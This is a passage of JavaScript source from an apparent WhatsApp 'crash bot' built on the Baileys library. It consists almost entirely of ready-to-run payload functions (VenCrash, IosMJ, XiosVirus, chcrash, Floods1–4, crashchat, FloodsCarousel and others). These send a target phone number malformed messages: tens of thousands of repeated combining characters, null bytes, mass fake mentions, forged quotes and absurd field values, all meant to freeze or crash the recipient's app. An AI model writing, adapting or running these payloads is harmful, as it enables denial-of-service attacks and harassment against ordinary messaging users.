                  title: "Nested row 1",
                  id: `nested_id1_${i}`,
                  subsubrows: [
                    {
                      title: "Deep Nested row 1",
                      id: `deep_nested_id1_${i}`,
                    },
                    {
                      title: "Deep Nested row 2",
                      id: `deep_nested_id2_${i}`,
                    },
                  ],
                },
                {
                  title: "Nested row 2",
                  id: `nested_id2_${i}`,
                },
              ],
            },
          ],
        };

        sections.push(deepNested);
      }

      let listMessage = {
        title: "꧀꧀Mark Zuckerberg Kontol, By JustinOfficial", 
        sections: sections,
      };

      let msg = generateWAMessageFromContent(
        bijipler,
        {
          viewOnceMessage: {
            message: {
              messageContextInfo: {
                deviceListMetadata: {},
                deviceListMetadataVersion: 2,
              },
              interactiveMessage: {
                contextInfo: {
                  mentionedJid: [bijipler],
                  isForwarded: true,
                  forwardingScore: 99999,
                  businessMessageForwardInfo: {
                    businessOwnerJid: bijipler,
                  },
                },
                body: {
                  text: "⿻ᬃ©21WithNoKids⃟⃟⿻",
                },
                footer: {
                  buttonParamsJson: "JSON.stringify(listMessage)",
                },
                header: {
                  buttonParamsJson: "JSON.stringify(listMessage)",
                  subtitle: "Mark Zuckerberg Kontol, By JustinOfficial",
                  hasMediaAttachment: false, // No media to focus purely on data overload
                },
                nativeFlowMessage: {
                    buttons: [
                        {
                                                name: "single_select",

                        buttonParamsJson: "JSON.stringify(listMessage)",

                      }, 

                      {

                        name: "payment_method",

                        buttonParamsJson: "JSON.stringify(listMessage)",

                      },

                      {

                        name: "call_permission_request",

                        buttonParamsJson: "JSON.stringify(listMessage)",

                      },

                      {

                        name: "single_select",

                        buttonParamsJson: "JSON.stringify(listMessage)",

                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "JSON.stringify(listMessage)",
                      },
                     ],
                  },
              },
            },
          },
        },
        { userJid: bijipler }
      );

      await Zeph.relayMessage(bijipler, msg.message, {
        participant: { jid: bijipler },
        messageId: msg.key.id,
      });
    }

async function invc2(nomor) {
     let bijipler = nomor
     let msg = await generateWAMessageFromContent(bijipler, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "",
                                hasMediaAttachment: false
                            },
                            body: {
                                text: ""
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "",
                                buttons: [{
                                        name: "single_select",
                                        buttonParamsJson: "z"
                                    },
                                    {
                                        name: "call_permission_request",
                                        buttonParamsJson: "{}"
                                    }
                                ]
                            }
                        }
                    }
                }
            }, {});

            await Zeph.relayMessage(bijipler, msg.message, {
                messageId: msg.key.id,
                participant: { jid: bijipler }
            });
        }
        

  async function invc(nomor) {
     let bijipler = nomor 
     let msg = await generateWAMessageFromContent(bijipler, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "dvx",
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "dvx"
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "",
                                buttons: [{
                                        name: "single_select",
                                        buttonParamsJson: "z"
                                    },
                                    {
                                        name: "call_permission_request",
                                        buttonParamsJson: "{}"
                                    }
                                ]
                            }
                        }
                    }
                }
            }, {});
      }
 
    
async function VenCrash(bijipler) {
      await Zeph.relayMessage(
        bijipler,
        {
          paymentInviteMessage: {
            serviceType: "VENMO",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: bijipler,
          },
        }
      );
    }

    async function AppXCrash(bijipler) {
      await Zeph.relayMessage(
        bijipler,
        {
          paymentInviteMessage: {
            serviceType: "CASHAPP",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: bijipler,
          },
        }
      );
    }

    async function SmCrash(bijipler) {
      await Zeph.relayMessage(
        bijipler,
        {
          paymentInviteMessage: {
            serviceType: "SAMSUNGPAY",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: bijipler,
          },
        }
      );
    }

    async function SqCrash(bijipler) {
      await Zeph.relayMessage(
        bijipler,
        {
          paymentInviteMessage: {
            serviceType: "SQUARE",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: bijipler,
          },
        }
      );
    }
      
async function FBiphone(bijipler) {
      await Zeph.relayMessage(
        bijipler,
        {
          paymentInviteMessage: {
            serviceType: "FBPAY",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: bijipler,
          },
        }
      );
    }

    async function QXIphone(bijipler) {
      let CrashQAiphone = "𑇂𑆵𑆴𑆿".repeat(60000);
      await Zeph.relayMessage(
        bijipler,
        {
          locationMessage: {
            degreesLatitude: 999.03499999999999,
            degreesLongitude: -999.03499999999999,
            name: CrashQAiphone,
            url: "https://youtube.com/@tamainfinity",
          },
        },
        {
          participant: {
            jid: bijipler,
          },
        }
      );
    }

    async function QPayIos(bijipler) {
      await Zeph.relayMessage(
        bijipler,
        {
          paymentInviteMessage: {
            serviceType: "PAYPAL",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: bijipler,
          },
        }
      );
    }

    async function QPayStriep(bijipler) {
      await Zeph.relayMessage(
        bijipler,
        {
          paymentInviteMessage: {
            serviceType: "STRIPE",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: bijipler,
          },
        }
      );
    }

    async function QDIphone(bijipler) {
      Zeph.relayMessage(
        bijipler,
        {
          extendedTextMessage: {
            text: "ꦾ".repeat(55000),
            contextInfo: {
              stanzaId: bijipler,
              participant: bijipler,
              quotedMessage: {
                conversation: "Broo" + "ꦾ࣯࣯".repeat(50000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
        {
          paymentInviteMessage: {
            serviceType: "UPI",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: bijipler,
          },
        },
        {
          messageId: null,
        }
      );
    }

    //

    async function IosMJ(bijipler, Ptcp = false) {
      await Zeph.relayMessage(
        bijipler,
        {
          extendedTextMessage: {
            text: "®21WithNoKids" + "ꦾ".repeat(90000),
            contextInfo: {
              stanzaId: "1234567890ABCDEF",
              participant: "0@s.whatsapp.net",
              quotedMessage: {
                callLogMesssage: {
                  isVideo: true,
                  callOutcome: "1",
                  durationSecs: "0",
                  callType: "REGULAR",
                  participants: [
                    {
                      jid: "0@s.whatsapp.net",
                      callOutcome: "1",
                    },
                  ],
                },
              },
              remoteJid: bijipler,
              conversionSource: "source_example",
              conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
              conversionDelaySeconds: 10,
              forwardingScore: 99999999,
              isForwarded: true,
              quotedAd: {
                advertiserName: "Example Advertiser",
                mediaType: "IMAGE",
                jpegThumbnail:
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                caption: "This is an ad caption",
              },
              placeholderKey: {
                remoteJid: "0@s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890",
              },
              expiration: 86400,
              ephemeralSettingTimestamp: "1728090592378",
              ephemeralSharedSecret:
                "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
              externalAdReply: {
                title: "21 WITH - NO KIDS !!!??",
                body: "📄⃟⃟⃟⃟⃚ ͢®21WithNoKids" + "𑜦࣯".repeat(200),
                mediaType: "VIDEO",
                renderLargerThumbnail: true,
                previewTtpe: "VIDEO",
                thumbnail:
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                sourceType: " x ",
                sourceId: " x ",
                sourceUrl: "https://www.instagram.com/WhatsApp",
                mediaUrl: "https://www.instagram.com/WhatsApp",
                containsAutoReply: true,
                renderLargerThumbnail: true,
                showAdAttribution: true,
                ctwaClid: "ctwa_clid_example",
                ref: "ref_example",
              },
              entryPointConversionSource: "entry_point_source_example",
              entryPointConversionApp: "entry_point_app_example",
              entryPointConversionDelaySeconds: 5,
              disappearingMode: {},
              actionLink: {
                url: "https://www.instagram.com/WhatsApp",
              },
              groupSubject: "Example Group Subject",
              parentGroupJid: "6287888888888-1234567890@g.us",
              trustBannerType: "trust_banner_example",
              trustBannerAction: 1,
              isSampled: false,
              utm: {
                utmSource: "utm_source_example",
                utmCampaign: "utm_campaign_example",
              },
              forwardedNewsletterMessageInfo: {
                newsletterJid: "6287888888888-1234567890@g.us",
                serverMessageId: 1,
                newsletterName: " bijipler ",
                contentType: "UPDATE",
                accessibilityText: " bijipler ",
              },
              businessMessageForwardInfo: {
                businessOwnerJid: "0@s.whatsapp.net",
              },
              smbClientCampaignId: "smb_client_campaign_id_example",
              smbServerCampaignId: "smb_server_campaign_id_example",
              dataSharingContext: {
                showMmDisclosure: true,
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: bijipler,
              },
            }
          : {}
      );
    }

    //

    async function XiosVirus(bijipler) {
      Zeph.relayMessage(
        bijipler,
        {
          extendedTextMessage: {
            text: `®21WithNoKids` + "࣯ꦾ".repeat(90000),
            contextInfo: {
              fromMe: false,
              stanzaId: bijipler,
              participant: bijipler,
              quotedMessage: {
                conversation: "®21WithNoKids" + "ꦾ".repeat(90000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
        {
          participant: {
            jid: bijipler,
          },
        },
        {
          messageId: null,
        }
      );
    }
 
 async function poolingcrash(bijipler) {
      try {
        let etc = generateWAMessageFromContent(
          bijipler,
          proto.Message.fromObject({
            pollCreationMessageV3: {
              name: "⿻📄⃟⃟⃟⃟⃚ ͢®21WithNoKids" + "ꦾိိိ့".repeat(1000), // Kurangi pengulangan
              options: [
                { optionName: "#21WithNoKids~" },
                { optionName: "#CTRExtreame~" },
                { optionName: "#I Love You.." },
                { optionName: "#But... You Loser" },
                { optionName: "#SuprixJinwo~!" },
                { optionName: "#RijaPmo~!" },
              ],
              selectableOptionsCount: 6,
            },
          }),
          { userJid: bijipler }
        );

        await Zeph.relayMessage(bijipler, etc.message, {
          messageId: etc.key.id,
        });
        console.log(chalk.green("Polling sent successfully"));
      } catch (error) {
        console.error("Error sending message:", error);
      }
    }

    //

    async function chcrash(bijipler) {
      let virtex = "📄⃟⃟⃟⃟⃚ ͢®21WithNoKids" + "ꦾ".repeat(50000);
      let mentionedJidArray = Array.from(
        { length: 35000 },
        () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
      );
      var messageContent = generateWAMessageFromContent(
        bijipler,
        proto.Message.fromObject({
          viewOnceMessage: {
            message: {
              newsletterAdminInviteMessage: {
                newsletterJid: `120363321780343299@newsletter`,
                newsletterName: virtex,
                jpegThumbnail: "",
                caption: virtex,
                inviteExpiration: Date.now() + 1814400000,
              },
              contextInfo: {
                mentionedJid: mentionedJidArray,
                groupMentions: [
                  {
                    groupJid: "120363321780343299@newsletter",
                    groupSubject: virtex,
                  },
                ],
              },
            },
          },
        }),
        {
          userJid: bijipler,
        }
      );
      await Zeph.relayMessage(bijipler, messageContent.message, {
        participant: {
          jid: bijipler,
        },
        messageId: messageContent.key.id,
      });
    }

    async function chcrash2(bijipler) {
      let mentionedJidArray = Array.from(
        { length: 35000 },
        () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
      );
      var messageContent = generateWAMessageFromContent(
        bijipler,
        proto.Message.fromObject({
          viewOnceMessage: {
            message: {
              newsletterAdminInviteMessage: {
                newsletterJid: `120363321780343299@newsletter`,
                newsletterName: "\u0000" + "ꦾ".repeat(90000),
                jpegThumbnail: "",
                caption: "\u0000" + "ꦾ".repeat(90000),
                inviteExpiration: Date.now(),
              },
              contextInfo: {
                mentionedJid: mentionedJidArray,
                groupMentions: [
                  {
                    groupJid: "120363321780343299@newsletter",
                    groupSubject: "T-RYUICHI><",
                  },
                ],
              },
            },
          },
        }),
        {
          userJid: bijipler,
        }
      );
      await Zeph.relayMessage(bijipler, messageContent.message, {
        participant: {
          jid: bijipler,
        },
        messageId: messageContent.key.id,
      });
    }
    
 const QBug = {
      key: {
        remoteJid: "p",
        fromMe: false,
        participant: "0@s.whatsapp.net",
      },
      message: {
        interactiveResponseMessage: {
          body: {
            text: "Sent",
            format: "DEFAULT",
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(
              500000
            )}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
            version: 3,
          },
        },
      },
    };    
 async function Floods1(bijipler) {
      Zeph.relayMessage(
        bijipler,
        {
          groupMentionedMessage: {
            message: {
              interactiveMessage: {
                header: {
                  locationMessage: {
                    degreesLatitude: 0,
                    degreesLongitude: 0,
                  },
                  hasMediaAttachment: true,
                },
                body: {
                  text:
                    "®21WithNoKids" +
                    "ꦾ".repeat(120000) +
                    "@1".repeat(250000),
                },
                nativeFlowMessage: {},
                contextInfo: {
                  mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                  groupMentions: [
                    { groupJid: "1@newsletter", groupSubject: "TAMAXSENTRY" },
                  ],
                },
              },
            },
          },
        },
        { participant: { jid: bijipler } },
        { messageId: null }
      );

      // Jeda 3 detik
      await new Promise((resolve) => setTimeout(resolve, 2000));
    }

    //

    async function Floods2(bijipler) {
      Zeph.relayMessage(
        bijipler,
        {
          groupMentionedMessage: {
            message: {
              interactiveMessage: {
                header: {
                  locationMessage: {
                    degreesLatitude: 0,
                    degreesLongitude: 0,
                  },
                  hasMediaAttachment: true,
                },
                body: {
                  text:
                    "⿻ᬃ©21WithNoKids⃟⃟⿻" +
                    "ꦾ".repeat(50000) +
                    "@1".repeat(120000),
                },
                nativeFlowMessage: {},
                contextInfo: {
                  mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                  groupMentions: [
                    { groupJid: "1@newsletter", groupSubject: "TAMAESENTRY" },
                  ],
                },
              },
            },
          },
        },
        { participant: { jid: bijipler } },
        { messageId: null }
      );

      // Jeda 3 detik
      await new Promise((resolve) => setTimeout(resolve, 2000));
    }

    //

    async function Floods3(bijipler) {
      Zeph.relayMessage(
        bijipler,
        {
          groupMentionedMessage: {
            message: {
              interactiveMessage: {
                header: {
                  locationMessage: {
                    degreesLatitude: 0,
                    degreesLongitude: 0,
                  },
                  hasMediaAttachment: true,
                },
                body: {
                  text:
                    "⿻ᬃ©21WithNoKids⃟⃟⿻" +
                    "ꦾ".repeat(120000) +
                    "@1".repeat(250000),
                },
                nativeFlowMessage: {},
                contextInfo: {
                  mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                  groupMentions: [
                    { groupJid: "1@newsletter", groupSubject: "TAMAXSENTRY" },
                  ],
                },
              },
            },
          },
        },
        { participant: { jid: bijipler } },
        { messageId: null }
      );

      // Jeda 3 detik
      await new Promise((resolve) => setTimeout(resolve, 2000));
    }

    //

    async function BugGiff(bijipler, QBug) {
      try {
        const etc = generateWAMessageFromContent(
          bijipler,
          proto.Message.fromObject({
            videoMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7161-24/32600320_1359746598331420_5186781147629135099_n.enc?ccb=11-4&oh=01_Q5AaIJrw3rMcUPjfaHMUAnAjywjLgHwu-ufclRPU54jupBZb&oe=6768433F&_nc_sid=5e03e0&mms3=true",
              mimetype: "video/mp4",
              fileSha256: "NwQaS3YczNRl5lHhBZ5fo6RfNbO1iB8r0hqtKYMguQA=",
              fileLength: "5113321",
              mediaKey: "Nt9lZ1+Rjy/MH91bbYq3EJ3jsFSooUfpXDKRv/nIMHk=",
              caption:
                "⿻ᬃ©21WithNoKids" +
                "\u0000" +
                "ꦾ".repeat(55000) +
                "@1".repeat(75000),
              gifPlayback: true,
              fileEncSha256: "ztwwbXAv4IQnyzzrJJqVLqtXb9azUP09llxVmjeh5TA=",
              directPath:
                "/v/t62.7161-24/32600320_1359746598331420_5186781147629135099_n.enc?ccb=11-4&oh=01_Q5AaIJrw3rMcUPjfaHMUAnAjywjLgHwu-ufclRPU54jupBZb&oe=6768433F&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1732298375",
              jpegThumbnail:
                "/9j//gAQTGF2YzU4LjkxLjEwMAD/2wBDAAgEBAQEBAUFBQUFBQYGBgYGBgYGBgYGBgYHBwcICAgHBwcGBgcHCAgICAkJCQgICAgJCQoKCgwMCwsODg4RERT/xABhAAEBAQEBAAAAAAAAAAAAAAACAQADBwEBAQAAAAAAAAAAAAAAAAAAAAEQAAEDBAICAwEAAAAAAAAAAAABAoGxETIDofAT0WExUSERAQEBAQAAAAAAAAAAAAAAAAABEVH/wAARCAAnACADASIAAhEAAxEA/9oADAMBAAIRAxEAPwDwZPopGLdqTUpdvV29YOzBYqIO3BYqNvTb1tWCTUQdf8Yk1ERGuHbgsVEHbgsVAKbmolrL2S+Zvzx7ORgOvnb+Lx7I/a1zVSy9k5mA/9k=",
              gifAttribution: "NONE",
            },
          }),
          {
            userJid: bijipler,
            quoted: QBug,
          }
        );
        await Zeph.relayMessage(bijipler, etc.message, {
          participant: { jid: bijipler, quoted: QBug },
          messageId: etc.key.id,
        });
        console.log(chalk.green(""));
      } catch (error) {
        console.error("Error ngirim pesan:", error);
      }
    }

    //

    async function BugLoca7(bijipler) {
      Zeph.relayMessage(
        bijipler,
        {
          groupMentionedMessage: {
            message: {
              interactiveMessage: {
                header: {
                  locationMessage: {
                    degreesLatitude: 0,
                    degreesLongitude: 0,
                  },
                  hasMediaAttachment: true,
                },
                body: {
                  text:
                    "⿻ᬃ©21WithNoKids⃟⃟⿻" + "ꦾ".repeat(120000) + "@1".repeat(250000),
                },
                nativeFlowMessage: {},
                contextInfo: {
                  mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                  groupMentions: [
                    { groupJid: "1@newsletter", groupSubject: "TAMAESENTRY" },
                  ],
                },
              },
            },
          },
        },
        { participant: { jid: bijipler } },
        { messageId: null }
      );
    }

    //
    async function BugLoca8(bijipler) {
      let virtex = "⿻ᬃ⿻ᬃ©21WithNoKids⃟⃟⿻𝐥⃟⃟⿻";

      await Zeph.relayMessage(
        bijipler,
        {
          groupMentionedMessage: {
            message: {
              interactiveMessage: {
                header: {
                  locationMessage: {
                    degreesLatitude: 0,
                    degreesLongitude: 0,
                  },
                  hasMediaAttachment: true,
                },
                body: {
                  text: "®21WithNoKids" + "@1".repeat(90000),
                },
                nativeFlowMessage: {},
                contextInfo: {
                  mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                  groupMentions: [
                    { groupJid: "1@newsletter", groupSubject: "TAMAXSENTRY" },
                  ],
                },
              },
            },
          },
        },
        { participant: { jid: bijipler } },
        { messageId: null }
      );
    }

    //

    async function Floods4(bijipler) {
      await Zeph.relayMessage(
        bijipler,
        {
          groupMentionedMessage: {
            message: {
              interactiveMessage: {
                header: {
                  locationMessage: {
                    degreesLatitude: 0,
                    degreesLongitude: 0,
                  },
                  hasMediaAttachment: true,
                },
                body: {
                  text:
                    "®21WithNoKids" +
                    "\u0000".repeat(1000) +
                    "ꦾ".repeat(103000),
                },
                nativeFlowMessage: {},
                contextInfo: {
                  mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                  groupMentions: [
                    { groupJid: "1@newsletter", groupSubject: " TAMAXSENTRY " },
                  ],
                },
              },
            },
          },
        },
        { participant: { jid: bijipler } },
        { messageId: null }
      );
    }

    //

    async function crashchat(bijipler) {
      let FXTbug = {
        key: {
          fromMe: false,
          participant: "0@s.whatsapp.net",
          remoteJid: "status@broadcast",
        },
        message: {
          documentMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
            mimetype:
              "application/vnd.openxmlformats-officedocument.presentationml.presentation",
            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
            fileLength: "999999999",
            pageCount: 0x9184e729fff,
            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
            fileName: "@21WithNoKids" + "ꦾ".repeat(103000),
            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
            directPath:
              "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
            mediaKeyTimestamp: "1715880173",
            contactVcard: true,
          },
        },
      };

      await Zeph.sendMessage(bijipler, { text: "Bantu ramein ch saya bro" }, { quoted: FXTbug });
    }

    //
    async function FloodsCarousel2(bijipler, Thumb, Ptcp = true) {
      const header = proto.Message.InteractiveMessage.Header.create({
        ...(await prepareWAMessageMedia(
          { image: { url: "https://pomf2.lain.la/f/xq1r1r9q.jpg" } },
          { upload: Zeph.waUploadToServer }
        )),
        title: "⩟ - ®21WithNoKids  ϟ" + "ꦾ".repeat(100000),
        subtitle: "⿻ᬃ©21WithNoKids⃟⃟⿻",
        hasMediaAttachment: true,
      });

      const body = {
        text: "\u0000" + "ꦾ".repeat(90000),
      };

      // Example carousel content
      const carouselMessage = {
        sections: [
          {
            title: " ⿻ᬃ©21WithNoKids⃟⃟⿻ϟ ",
            rows: [
              {
                title: " ⿻ᬃ©21WithNoKids⃟⃟⿻",
                description: "ꦾ".repeat(55555),
                rowId: "@1".repeat(55555),
              },
              {
                title: " ϟ ",
                description: "ꦾ".repeat(55555),
                rowId: "@1".repeat(55555),
              },
            ],
          },
          {
            title: "⿻ᬃ©21WithNoKids⃟⃟⿻",
            rows: [
              {
                title: "⿻ᬃ©21WithNoKids⃟⃟⿻",
                description: "ꦾ".repeat(55555),
                rowId: "@1".repeat(55555),
              },
              {
                title: " ϟ ",
                description: "ꦾ".repeat(55555),
                rowId: "@1".repeat(55555),
              },
            ],
          },
        ],
      };

      await Zeph.relayMessage(
        bijipler,
        {
          ephemeralMessage: {
            message: {
              interactiveMessage: {
                header: header,
                body: body,
                carouselMessage: carouselMessage,
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: bijipler,
              },
            }
          : {}
      );

      console.log(chalk.blue.bold("Hs"));
    }
    //
    async function FloodsCarousel(bijipler, QBug, Ptcp = true) {
      const header = {
        locationMessage: {
          degreesLatitude: 0,
          degreesLongitude: 0,
        },
        hasMediaAttachment: true,
      };

      const body = {
        text: "©21WithNoKids\n" + "ꦾ".repeat(90000),
      };

      const carouselMessage = {
        sections: [
          {
            title: " ϟ ",
            rows: [
              { title: " ϟ ", description: " ", rowId: ".crasher" },
              { title: " ϟ ", description: " ", rowId: ".crasher" },
            ],
          },
          {
            title: "Section 2",
            rows: [
              { title: " ϟ ", description: " ", rowId: ".crasher" },
              { title: " ϟ ", description: " ", rowId: ".crasher" },
            ],
          },
        ],
      };

      await Zeph.relayMessage(
        bijipler,
        {
          ephemeralMessage: {
            message: {
              interactiveMessage: {
                header: header,
                body: body,
                carouselMessage: carouselMessage,
              },
            },
          },
        },
        Ptcp ? { participant: { jid: bijipler } } : { quoted: QBug }
      );
    }
    
    async function xeonHARD(bijipler, ptcp = false) {
const gg = "ꦽ".repeat(10200);
const ggg = "ꦿꦾ".repeat(10200);
          Zeph.relayMessage(bijipler, {
            viewOnceMessage: {
              message: {
                extendedTextMessage: {
                  text: "©21WithNoKids'\n" + gg,
                  previewType: "*乂⃰͜͡21®",
                  contextInfo: {
                    mentionedJid: [bijipler]
                  }
                }
              }
            }
          }, {
            participant: {
              jid: bijipler
            }
          });
          await Zeph.relayMessage(bijipler, {
            viewOnceMessage: {
              message: {
                interactiveMessage: {
                  body: {
                    text: "©21WithNoKids"
                  },
                  footer: {
                    text: "Brum Brum Brum🚙"
                  },
                  header: {
                    documentMessage: {
                      url: "https://mmg.whatsapp.net/v/t62.7119-24/19973861_773172578120912_2263905544378759363_n.enc?ccb=11-4&oh=01_Q5AaIMqFI6NpAOoKBsWqUR52hN9p5YIGxW1TyJcHyVIb17Pe&oe=6653504B&_nc_sid=5e03e0&mms3=true",
                      mimetype: "application/pdf",
                      fileSha256: "oV/EME/ku/CjRSAFaW+b67CCFe6G5VTAGsIoimwxMR8=",
                      fileLength: null,
                      pageCount: 99999999999999,
                      contactVcard: true,
